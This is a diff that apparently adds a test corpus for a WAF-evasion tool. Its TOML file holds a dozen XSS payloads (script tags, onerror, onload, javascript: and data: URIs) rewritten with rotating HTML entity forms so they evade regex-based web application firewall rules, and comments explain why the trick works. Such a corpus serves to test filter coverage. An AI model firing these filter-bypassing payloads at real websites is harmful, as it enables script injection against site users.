@@ -1,0 +1,94 @@
+schema = 1
+# XSS payloads designed to exercise the `html_entity_variants` tamper.
+#
+# Mechanism: each output character cycles through 4 browser-tolerant HTML
+# entity forms — `&#xHH;`, `&#XHH;`, `&#DD;`, `&#000DD;`. WAF regexes that
+# anchor on a single canonical form (e.g. ModSec CRS pre-2024 patterns that
+# match `@rx (?i)&#x[0-9a-f]+;`) miss the mixed-case-X / decimal / zero-pad
+# variants. Browsers decode all four identically — payload reaches the DOM
+# while only 25% of characters match the anchor.
+#
+# Manual form: `wafrift evade --only tamper/html_entity_variants --payload
+# '<script>alert(1)</script>'`. The corpus here pre-encodes representative
+# payloads so the bench can exercise the path without round-tripping the
+# tamper on every run.
+
+# ── Bare-tag XSS via mixed entity forms ──
+
+[[case]]
+id = "entity_variants_script_tag"
+class = "xss"
+payload = "&#x3c;&#X73;&#99;&#000114;&#x69;&#X70;&#116;&#000062;alert(1)&#x3c;/&#X73;&#99;&#000114;&#x69;&#X70;&#116;&#000062;"
+description = "<script>alert(1)</script> with each angle bracket and tag-name char in a different entity form. Lowercase-x regex misses 3 of 4 chars."
+
+[[case]]
+id = "entity_variants_img_onerror"
+class = "xss"
+payload = "&#x3c;&#X69;&#109;&#000103; src=x &#x6f;&#X6e;&#101;&#000114;&#x72;&#X6f;&#114;=alert(1)&#000062;"
+description = "<img onerror=alert(1)> with rotated entity forms on tag-name + handler-name chars."
+
+[[case]]
+id = "entity_variants_svg_onload"
+class = "xss"
+payload = "&#x3c;&#X73;&#118;&#000103; &#x6f;&#X6e;&#108;&#000111;&#x61;&#X64;=alert(1)&#000062;"
+description = "<svg onload=alert(1)> — entity-variant rotation hides 'svg' and 'onload' from regex anchored on `&#x` form."
+
+[[case]]
+id = "entity_variants_body_onload"
+class = "xss"
+payload = "&#x3c;&#X62;&#111;&#000100;&#x79; &#X6f;&#110;&#000108;&#x6f;&#X61;&#100;=alert(1)&#000062;"
+description = "<body onload=...> attribute-context bypass via per-char form rotation."
+
+[[case]]
+id = "entity_variants_iframe_javascript_uri"
+class = "xss"
+payload = "&#x3c;&#X69;&#102;&#000114;&#x61;&#X6d;&#101; src=&#x6a;&#X61;&#118;&#000097;&#x73;&#X63;&#114;&#000105;&#x70;&#X74;:alert(1)&#000062;"
+description = "<iframe src=javascript:...> — entity rotation across both the iframe tag and the javascript: URI scheme."
+
+# ── Event-handler smuggling via decimal-zero-pad form ──
+
+[[case]]
+id = "entity_variants_input_autofocus_onfocus"
+class = "xss"
+payload = "&#x3c;input autofocus &#X6f;&#110;&#000102;&#x6f;&#X63;&#117;&#000115;=alert(1)&#000062;"
+description = "<input autofocus onfocus=...> — keeps tag in ASCII, rotates only the event handler name; tests partial-encoding regex coverage."
+
+[[case]]
+id = "entity_variants_details_ontoggle"
+class = "xss"
+payload = "&#x3c;details open &#X6f;&#110;&#000116;&#x6f;&#X67;&#103;&#000108;&#x65;=alert(1)&#000062;"
+description = "<details open ontoggle=...> — HTML5 dialog element via decimal-rotated event handler name."
+
+[[case]]
+id = "entity_variants_marquee_onstart"
+class = "xss"
+payload = "&#x3c;marquee &#X6f;&#110;&#000115;&#x74;&#X61;&#114;&#000116;=alert(1)&#000062;"
+description = "<marquee onstart=...> — legacy element + handler rotation hits regex sets that only update for modern handlers."
+
+# ── Polyglot: entity-variant on context-breakers ──
+
+[[case]]
+id = "entity_variants_double_quote_context_escape"
+class = "xss"
+payload = "&#000034;&#x3e;&#X3c;&#115;&#000099;&#x72;&#X69;&#112;&#000116;&#x3e;alert(1)&#X3c;/&#115;&#000099;&#x72;&#X69;&#112;&#000116;&#x3e;"
+description = "\">  <script>...</script> — attribute-context escape using decimal-zero-pad form for the quote; bypasses regexes anchored on '%22' or '\\&quot;'."
+
+[[case]]
+id = "entity_variants_single_quote_context_escape"
+class = "xss"
+payload = "&#000039;&#x3e;&#X3c;&#115;&#000099;&#x72;&#X69;&#112;&#000116;&#x3e;alert(1)&#X3c;/&#115;&#000099;&#x72;&#X69;&#112;&#000116;&#x3e;"
+description = "'><script>...</script> — single-quote attribute break; the encoded `'` (codepoint 39) lands in the zero-pad slot."
+
+# ── Stress: long payload exercising slot rotation modulo 4 ──
+
+[[case]]
+id = "entity_variants_long_alert_unhex"
+class = "xss"
+payload = "&#x3c;&#X73;&#99;&#000114;&#x69;&#X70;&#116;&#000062;&#x61;&#X6c;&#101;&#000114;&#x74;&#X28;&#49;&#000041;&#x3c;&#X2f;&#115;&#000099;&#x72;&#X69;&#112;&#000116;&#x3e;"
+description = "Full `<script>alert(1)</script>` with rotation continuing for every char (22 chars / 5+ full cycles of 4-form rotation)."
+
+[[case]]
+id = "entity_variants_data_uri_html"
+class = "xss"
+payload = "&#x3c;&#X61; href=&#100;&#000097;&#x74;&#X61;:text/html,&#x3c;&#X73;&#99;&#000114;&#x69;&#X70;&#116;&#000062;alert(1)&#x3c;&#X2f;&#115;&#000099;&#x72;&#X69;&#112;&#000116;&#x3e;&#000062;Click&#x3c;/a&#000062;"
+description = "<a href=data:text/html,...>Click</a> — nested-context payload (anchor + data URI + inner script tag), every tag char in a rotated form."
